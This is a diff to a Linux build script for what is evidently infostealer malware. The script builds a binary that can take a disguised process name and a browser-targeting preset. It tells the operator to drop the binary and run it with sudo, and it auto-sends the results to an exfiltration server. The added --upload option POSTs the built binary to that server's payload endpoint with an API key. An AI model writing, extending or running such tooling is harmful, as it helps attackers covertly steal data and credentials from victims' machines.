@@ -251,6 +251,7 @@ PRESET=""
 BINARY_NAME=""
 EXFIL_URL="${EXFIL_URL:-}"
 EXFIL_KEY="${EXFIL_KEY:-}"
+UPLOAD=0
 
 print_usage() {
     echo "Usage: ./build_linux.sh [OPTIONS]"
@@ -259,6 +260,7 @@ print_usage() {
     echo "  --name BINARY       Custom binary name (process name in ps/top)"
     echo "  --exfil-url URL     Override exfil server URL"
     echo "  --exfil-key KEY     Override exfil API key"
+    echo "  --upload            Upload built binary to the payload server after building"
     echo ""
     echo "Presets:"
     echo "  BROWSERS"
@@ -277,6 +279,7 @@ while [[ $# -gt 0 ]]; do
         --name)       BINARY_NAME="$2"; shift 2 ;;
         --exfil-url)  EXFIL_URL="$2";   shift 2 ;;
         --exfil-key)  EXFIL_KEY="$2";   shift 2 ;;
+        --upload)     UPLOAD=1;         shift ;;
         --help|-h)    print_usage; exit 0 ;;
         *) echo "[!] Unknown argument: $1"; print_usage; exit 1 ;;
     esac
@@ -378,3 +381,20 @@ echo ""
 echo "[+] Done: $SCRIPT_DIR/$BINARY_NAME"
 echo "    Drop and run: sudo ./$BINARY_NAME"
 echo "    Results auto-exfil to $EXFIL_URL"
+
+# ── Upload to payload server ──────────────────────────────────────────────────
+if [[ "$UPLOAD" == "1" ]]; then
+    echo ""
+    echo "[*] Uploading $BINARY_NAME to $EXFIL_URL/payloads ..."
+    HTTP_STATUS=$(curl -s -o /tmp/bb_upload_resp.txt -w "%{http_code}" \
+        -X POST "$EXFIL_URL/payloads" \
+        -H "Authorization: Bearer $EXFIL_KEY" \
+        -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=$BINARY_NAME")
+    if [[ "$HTTP_STATUS" == "200" ]]; then
+        echo "[+] Uploaded: $EXFIL_URL/payloads"
+    else
+        echo "[!] Upload failed (HTTP $HTTP_STATUS)"
+        cat /tmp/bb_upload_resp.txt 2>/dev/null && echo ""
+    fi
+    rm -f /tmp/bb_upload_resp.txt
+fi
